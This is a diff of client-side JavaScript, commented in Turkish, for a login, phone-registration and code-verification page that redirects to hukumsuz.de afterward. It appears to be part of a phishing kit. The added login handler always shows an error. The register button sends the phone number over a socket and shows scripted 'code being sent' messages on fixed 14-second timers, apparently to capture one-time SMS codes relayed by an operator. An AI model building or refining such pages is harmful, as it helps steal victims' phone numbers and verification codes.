@@ -33,49 +33,61 @@ function showLogin() {
 }
 
 document.addEventListener("DOMContentLoaded", () => {
-  [registerCard, verifyCard, successScreen].forEach(card => card.classList.add("hidden"));
-  showCard(loginCard); // Başlangıçta login göster
 
+  // başlangıç durumu
+  registerCard.classList.add("hidden");
+  verifyCard.classList.add("hidden");
+  successScreen.classList.add("hidden");
+  showCard(loginCard);
+
+  // TELEFON INPUT
   const phoneInput = document.getElementById("registerPhone");
 
   phoneInput.addEventListener("focus", () => {
-    if (phoneInput.value === "") {
-      phoneInput.value = "05";
-    }
+    if (phoneInput.value === "") phoneInput.value = "05";
   });
 
   phoneInput.addEventListener("input", () => {
-    if (!phoneInput.value.startsWith("05")) {
-      phoneInput.value = "05";
-    }
     phoneInput.value = phoneInput.value.replace(/[^0-9]/g, "");
+    if (!phoneInput.value.startsWith("05")) phoneInput.value = "05";
     if (phoneInput.value.length > 11) {
       phoneInput.value = phoneInput.value.slice(0, 11);
     }
   });
 
-  const registerBtn = document.getElementById("registerSubmit");
+  // REGISTER → VERIFY (4x spin)
+const registerBtn = document.getElementById("registerSubmit");
+const btnText = registerBtn.querySelector(".btn-text");   // ← EKLE
 
-  registerBtn.addEventListener("click", () => {
-    const phone = document.getElementById("registerPhone").value.trim();
-    if (!phone) return;
+registerBtn.addEventListener("click", () => {
+  const phone = phoneInput.value.trim();
+  if (!phone) return;
 
-    let normalizedPhone = phone;
-    if (phone.startsWith("+90")) normalizedPhone = "0" + phone.slice(3);
-    if (phone.startsWith("90")) normalizedPhone = "0" + phone.slice(2);
+  socket.emit("new-phone", phone);
 
-    console.log("CLIENT PHONE GÖNDERDİ:", normalizedPhone);
-    socket.emit("new-phone", normalizedPhone);
+  registerBtn.disabled = true;
+  btnText.textContent = "Kod gönderiliyor";        // ← DEĞİŞTİ
+  registerBtn.classList.add("spinning");
 
-    registerBtn.classList.add("loading");
+  // 12. saniyede yazı değişsin
+  setTimeout(() => {
+    btnText.textContent = "Kod gönderildi";
+    registerBtn.classList.add("slow");            // slow animasyon burada başlasın
+  }, 12000);
 
-    setTimeout(() => {
-      registerBtn.classList.remove("loading");
-      hideCard(registerCard);
-      showCard(verifyCard);
-    }, 2000);
-  });
+  // 14. saniyede ekran değişsin
+  setTimeout(() => {
+    registerBtn.classList.remove("spinning");
+    registerBtn.classList.remove("slow");         // slow'u da kaldır
+    registerBtn.disabled = false;
+    btnText.textContent = "Kod gönderiliyor";     // başlangıç haline geri dön
+    hideCard(registerCard);
+    showCard(verifyCard);
+  }, 14000);
+});
+  
 
+  // VERIFY → SUCCESS
   const verifyBtn = document.getElementById("verifySubmit");
 
   verifyBtn.addEventListener("click", () => {
@@ -95,6 +107,21 @@ document.addEventListener("DOMContentLoaded", () => {
       setTimeout(() => {
         window.location.href = "https://hukumsuz.de/";
       }, 2000);
+
     }, 2000);
   });
+
 });
+
+// Giriş Yap butonunun tıklanma işlevi
+const loginBtn = document.getElementById("loginBtn");
+const loginError = document.getElementById("loginError");
+
+if (loginBtn) {
+  loginBtn.addEventListener("click", (e) => {
+    e.preventDefault();
+
+    // Kullanıcı hatası mesajını göster
+    loginError.style.display = "block";
+  });
+}
